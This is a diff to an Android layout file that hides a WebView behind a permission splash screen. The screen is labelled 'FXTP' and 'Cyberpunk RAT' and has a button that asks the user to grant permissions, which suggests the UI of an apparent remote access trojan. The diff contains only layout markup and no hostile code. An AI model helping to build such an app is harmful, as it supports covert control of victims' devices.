@@ -3,9 +3,61 @@
     android:layout_width="match_parent"
     android:layout_height="match_parent">
 
+    <!-- WebView (hidden initially) -->
     <WebView
         android:id="@+id/webView"
         android:layout_width="match_parent"
-        android:layout_height="match_parent" />
+        android:layout_height="match_parent"
+        android:visibility="gone" />
+
+    <!-- Permission splash overlay -->
+    <LinearLayout
+        android:id="@+id/splashLayout"
+        android:layout_width="match_parent"
+        android:layout_height="match_parent"
+        android:orientation="vertical"
+        android:gravity="center"
+        android:padding="32dp"
+        android:background="#0a0a12">
+
+        <TextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="⚡ FXTP"
+            android:textSize="48sp"
+            android:textStyle="bold"
+            android:textColor="#7c5cfc"
+            android:fontFamily="monospace" />
+
+        <TextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="Cyberpunk RAT"
+            android:textSize="18sp"
+            android:textColor="#e0e0ff"
+            android:fontFamily="monospace"
+            android:layout_marginBottom="32dp" />
+
+        <Button
+            android:id="@+id/btnStart"
+            android:layout_width="match_parent"
+            android:layout_height="56dp"
+            android:text="START FXTP"
+            android:backgroundTint="#7c5cfc"
+            android:textColor="#fff"
+            android:fontFamily="monospace"
+            android:textSize="18sp" />
+
+        <TextView
+            android:id="@+id/permStatus"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:layout_marginTop="16dp"
+            android:text="Press START to grant permissions"
+            android:textColor="#8a8a9e"
+            android:textSize="14sp"
+            android:gravity="center" />
+
+    </LinearLayout>
 
 </FrameLayout>
